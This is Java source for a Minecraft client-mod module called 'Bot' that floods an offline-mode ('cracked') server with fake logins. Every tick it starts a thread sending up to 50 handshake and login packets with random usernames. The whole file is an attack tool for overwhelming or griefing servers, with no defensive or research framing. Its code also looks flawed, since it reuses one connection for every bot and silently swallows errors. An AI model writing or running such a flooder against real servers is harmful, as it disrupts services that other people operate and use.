package me.soda.jesus.modules;

import me.soda.jesus.Addon;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.settings.StringSetting;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.ClientConnection;
import net.minecraft.network.NetworkState;
import net.minecraft.network.listener.ClientLoginPacketListener;
import net.minecraft.network.packet.c2s.handshake.HandshakeC2SPacket;
import net.minecraft.network.packet.c2s.login.LoginHelloC2SPacket;
import net.minecraft.network.packet.s2c.login.*;
import net.minecraft.text.Text;
import org.apache.commons.lang3.RandomStringUtils;

import java.net.InetSocketAddress;
import java.util.Optional;

public class Bot extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<String> ip = sgGeneral.add(new StringSetting.Builder()
        .name("Server IP")
        .defaultValue("127.0.0.1:25565")
        .build());

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("bots")
        .defaultValue(50)
        .sliderRange(1, 50)
        .build());

    public Bot() {
        super(Addon.CATEGORY, "bot", "when the server is cracked!");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        InetSocketAddress sa = (InetSocketAddress) mc.getNetworkHandler().getConnection().getAddress();
        ClientConnection con = ClientConnection.connect(sa, mc.options.shouldUseNativeTransport());
        String[] theip = ip.get().split(":");
        new Thread(() -> {
            for (int i = 0; i < amount.get(); i++) {
                try {
                    con.setPacketListener(new ClientLoginPacketListener() {
                        @Override
                        public void onHello(LoginHelloS2CPacket packet) {

                        }

                        @Override
                        public void onSuccess(LoginSuccessS2CPacket packet) {

                        }

                        @Override
                        public void onDisconnect(LoginDisconnectS2CPacket packet) {

                        }

                        @Override
                        public void onCompression(LoginCompressionS2CPacket packet) {

                        }

                        @Override
                        public void onQueryRequest(LoginQueryRequestS2CPacket packet) {

                        }

                        @Override
                        public void onDisconnected(Text reason) {

                        }

                        @Override
                        public ClientConnection getConnection() {
                            return null;
                        }
                    });
                    con.send(new HandshakeC2SPacket(theip[0], Integer.parseInt(theip[1]), NetworkState.LOGIN));
                    con.send(new LoginHelloC2SPacket(RandomStringUtils.randomAlphanumeric(4, 16), Optional.empty()));
                } catch (Exception e) {

                }
            }
        }).start();
    }
}
